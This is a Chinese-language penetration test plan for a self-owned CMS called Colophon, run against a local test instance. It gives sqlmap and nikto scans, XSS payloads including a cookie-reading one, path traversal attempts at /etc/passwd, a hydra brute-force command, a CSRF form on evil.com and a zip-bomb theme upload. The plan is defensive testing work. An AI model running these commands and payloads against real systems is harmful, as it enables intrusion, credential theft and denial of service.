# Colophon 渗透测试计划

**测试日期**: 待定  
**测试环境**: 独立测试实例（非生产）  
**测试工具**: hackingtool, nmap, sqlmap, nikto  
**测试授权**: ✅ 已获得（自有项目）

---

## 测试环境准备

### 1. 启动测试实例

```bash
cd D:\codes\colophon

# 使用独立数据库
$env:COLOPHON__DATABASE__PATH="test_security_audit.db"
$env:COLOPHON__AUTH__SECRET="test-secret-insecure-for-testing-only"
$env:COLOPHON__SERVER__PORT="3000"
$env:RUST_LOG="info"

# 启动服务
cargo run
```

**注意**：
- ✅ 使用独立数据库（test_security_audit.db）
- ✅ 不要用生产数据
- ✅ 测试后删除测试数据库

### 2. 初始化测试账号

访问 http://localhost:3000/admin 完成初始化：
- 管理员账号: `test_admin`
- 密码: `TestPass123!`

---

## hackingtool 使用指南

### 启动 hackingtool

```bash
wsl
cd /home/wenary/hackingtool
python3 hackingtool.py
```

### 常用模块

hackingtool 是一个集成工具集，包含：
1. **信息收集** - nmap, whois, subfinder
2. **漏洞扫描** - nikto, SQLMap
3. **Web 攻击** - XSS, SQL 注入
4. **密码破解** - hydra, john

---

## 测试清单

### 测试 1: SQL 注入扫描

**目标**: 确认所有输入点使用参数化查询

**测试端点**:
- 登录: POST /api/v1/auth/login
- 搜索: GET /api/v1/search?q=
- 评论: POST /api/v1/posts/{slug}/comments

**使用 sqlmap（WSL）**:
```bash
wsl sqlmap -u "http://localhost:3000/api/v1/search?q=test" \
    --batch \
    --level=3 \
    --risk=2 \
    --technique=BEUSTQ
```

**预期结果**: ✅ 无 SQL 注入漏洞（sqlx 参数化查询）

---

### 测试 2: XSS 攻击

**目标**: 确认 ammonia 正确清理 HTML

**测试向量**:
```javascript
// 在文章内容/评论中尝试注入
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(document.cookie)>
<iframe src="javascript:alert('XSS')"></iframe>
```

**测试步骤**:
1. 登录管理后台
2. 创建文章，在 Markdown 中插入上述代码
3. 发布并查看前端渲染

**预期结果**: ✅ 所有脚本被 ammonia 清理

---

### 测试 3: Webhook SSRF（已知漏洞）

**目标**: 验证 P1 漏洞存在

**测试步骤**:
```bash
# 1. 创建指向内网的 webhook
curl -X POST http://localhost:3000/api/v1/admin/webhooks \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SSRF Test",
    "url": "http://127.0.0.1:3000/api/v1/health",
    "events": "post.after_publish",
    "enabled": true
  }'

# 2. 发布文章触发 webhook
curl -X POST http://localhost:3000/api/v1/admin/posts \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "SSRF Test",
    "content": "Test",
    "status": "published"
  }'

# 3. 检查 webhook 日志
# 预期：成功请求内网地址
```

**预期结果**: ⚠️ 漏洞存在，webhook 可以访问 127.0.0.1

---

### 测试 4: 路径遍历攻击

**目标**: 确认文件上传/下载不允许目录遍历

**测试向量**:
```bash
# 尝试访问系统文件
curl http://localhost:3000/uploads/../../../etc/passwd
curl http://localhost:3000/static/themes/../../../config/config.toml

# 尝试下载备份（路径遍历）
curl -X GET http://localhost:3000/api/v1/admin/backup/../../../colophon.db \
  -H "Cookie: session=YOUR_SESSION_TOKEN"
```

**预期结果**: ✅ 返回 403 Forbidden 或 404 Not Found

---

### 测试 5: 认证绕过

**目标**: 确认所有 /api/v1/admin/* 端点需要 AdminUser

**测试步骤**:
```bash
# 1. 不带 Cookie 访问 admin 端点
curl -X GET http://localhost:3000/api/v1/admin/posts

# 2. 使用普通用户 token 访问
# （需先注册普通用户）
curl -X GET http://localhost:3000/api/v1/admin/posts \
  -H "Cookie: session=MEMBER_TOKEN"
```

**预期结果**: ✅ 返回 401 Unauthorized

---

### 测试 6: 暴力破解防护

**目标**: 确认登录速率限制生效

**使用 hydra（WSL）**:
```bash
wsl hydra -l test_admin -P /usr/share/wordlists/rockyou.txt \
    localhost -s 3000 \
    http-post-form "/api/v1/auth/login:login=^USER^&password=^PASS^:F=incorrect"
```

**预期结果**: ✅ 8 次失败后被限速（60秒窗口）

---

### 测试 7: CSRF 防护

**目标**: 确认 SameSite=Strict Cookie 阻止跨站请求

**测试步骤**:
1. 在 http://evil.com 创建表单：
```html
<form action="http://localhost:3000/api/v1/admin/posts" method="POST">
  <input name="title" value="CSRF Attack">
  <input name="content" value="Malicious">
</form>
<script>document.forms[0].submit()</script>
```
2. 受害者已登录 Colophon
3. 访问 evil.com

**预期结果**: ✅ 请求失败（Cookie 不发送）

---

### 测试 8: Zip Bomb（已知漏洞）

**目标**: 验证 P2 漏洞存在

**测试步骤**:
1. 创建 Zip Bomb：
```bash
# 生成 10GB 文件（压缩后约 10MB）
dd if=/dev/zero bs=1M count=10240 | gzip > bomb.gz
# 打包为主题 ZIP
mkdir fake_theme
echo 'slug = "bomb"' > fake_theme/theme.toml
cp bomb.gz fake_theme/payload.gz
zip -r bomb_theme.zip fake_theme/
```
2. 上传主题：
```bash
curl -X POST http://localhost:3000/api/v1/admin/themes/upload \
  -H "Cookie: session=YOUR_SESSION_TOKEN" \
  -F "file=@bomb_theme.zip"
```

**预期结果**: ⚠️ 漏洞存在，服务器磁盘空间耗尽

---

### 测试 9: 端口扫描（nmap）

**目标**: 确认只暴露必要端口

```bash
wsl nmap -sV -p- localhost
```

**预期结果**: ✅ 只开放 3000 端口

---

### 测试 10: Web 漏洞综合扫描（nikto）

**目标**: 自动化扫描常见 Web 漏洞

```bash
wsl nikto -h http://localhost:3000
```

**预期结果**: ✅ 无高危漏洞

---

## 测试报告模板

### 漏洞报告格式

```markdown
## 漏洞 #X: [漏洞名称]

**严重等级**: P0 / P1 / P2 / P3  
**CVSS 评分**: X.X  
**影响范围**: [描述]

### 复现步骤
1. [步骤 1]
2. [步骤 2]

### PoC（概念验证）
```bash
[命令或代码]
```

### 修复建议
[具体修复方案]

### 参考资料
- [OWASP 链接]
```

---

## 测试后清理

```bash
# 停止测试服务
# Ctrl+C

# 删除测试数据库
Remove-Item D:\codes\colophon\test_security_audit.db

# 删除上传的测试文件
Remove-Item -Recurse D:\codes\colophon\uploads\*test*
```

---

## 已知漏洞验证清单

| 漏洞编号 | 漏洞名称 | 测试编号 | 预期结果 | 实际结果 |
|---------|---------|---------|---------|---------|
| P1-1 | Webhook SSRF | 测试 3 | ⚠️ 存在 | [ ] |
| P1-2 | 重定向跟随 | 测试 3 | ⚠️ 存在 | [ ] |
| P2-1 | CSP unsafe-inline | 测试 2 | ⚠️ 存在 | [ ] |
| P2-2 | 默认 secret | 手动检查 | ⚠️ 存在 | [ ] |
| P2-3 | Zip Bomb | 测试 8 | ⚠️ 存在 | [ ] |

---

## 注意事项

1. **仅在授权环境测试** - 不要对生产环境或他人系统进行渗透测试
2. **记录所有操作** - 保存测试日志用于报告
3. **及时清理** - 测试后删除测试数据
4. **谨慎使用 DoS 测试** - Zip Bomb 测试可能导致系统不可用

---

**编写人**: Kiro Security Team  
**版本**: 1.0  
**最后更新**: 2026-06-09